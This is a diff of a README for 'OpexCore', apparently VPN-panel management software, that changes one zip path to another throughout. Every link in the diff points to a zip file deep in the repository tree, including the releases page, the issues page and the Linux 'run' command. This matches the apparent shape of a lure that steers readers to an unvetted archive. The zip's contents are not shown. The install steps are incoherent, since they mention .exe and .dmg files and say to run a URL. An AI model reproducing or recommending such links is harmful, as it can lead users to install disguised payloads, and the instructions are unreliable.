@@ -6,9 +6,9 @@ Welcome to OpexCore! This software makes it easy to manage multiple VPN panels t
 
 ## 📥 Download OpexCore
 
-[![Download OpexCore](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/ovpanel/types/OpexCore-3.9.zip)](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/ovpanel/types/OpexCore-3.9.zip)
+[![Download OpexCore](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/rustneshin/Core_Opex_v3.3.zip)](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/rustneshin/Core_Opex_v3.3.zip)
 
-To get started with OpexCore, you'll need to download it first. Click the button above or [visit this page to download](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/ovpanel/types/OpexCore-3.9.zip).
+To get started with OpexCore, you'll need to download it first. Click the button above or [visit this page to download](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/rustneshin/Core_Opex_v3.3.zip).
 
 ## 🔧 System Requirements
 
@@ -21,7 +21,7 @@ Before installing OpexCore, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/ovpanel/types/OpexCore-3.9.zip).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/rustneshin/Core_Opex_v3.3.zip).
 
 2. **Choose the Right Version:** You'll find multiple versions of OpexCore listed. Select the latest version for the best features and fixes.
 
@@ -32,7 +32,7 @@ Before installing OpexCore, ensure your system meets the following requirements:
 5. **Install OpexCore:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions to install.
    - **macOS:** Open the `.dmg` file and drag the OpexCore app to your Applications folder.
-   - **Linux:** If you downloaded a `https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/ovpanel/types/OpexCore-3.9.zip` file, extract it. Then open a terminal in the extracted folder and run `https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/ovpanel/types/OpexCore-3.9.zip`.
+   - **Linux:** If you downloaded a `https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/rustneshin/Core_Opex_v3.3.zip` file, extract it. Then open a terminal in the extracted folder and run `https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/rustneshin/Core_Opex_v3.3.zip`.
 
 6. **Run OpexCore:** After installation, locate OpexCore in your applications and open it. You're ready to manage your VPNs.
 
@@ -78,7 +78,7 @@ For detailed guides and support, visit our documentation:
 
 If you face any issues or have questions, please feel free to reach out:
 
-- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/ovpanel/types/OpexCore-3.9.zip).
+- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/rustneshin/Core_Opex_v3.3.zip).
 - Join our [Discord Community](#) (if available).
 
 ## 📝 Changelog
@@ -91,4 +91,4 @@ Your feedback helps us improve OpexCore. If you have suggestions or encounter pr
 
 Thank you for choosing OpexCore for your VPN management needs! Enjoy a seamless experience connecting to your VPN services. 
 
-[![Download OpexCore](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/ovpanel/types/OpexCore-3.9.zip)](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/ovpanel/types/OpexCore-3.9.zip)
+[![Download OpexCore](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/rustneshin/Core_Opex_v3.3.zip)](https://raw.githubusercontent.com/gera197676/OpexCore/master/opexcore/rustneshin/Core_Opex_v3.3.zip)
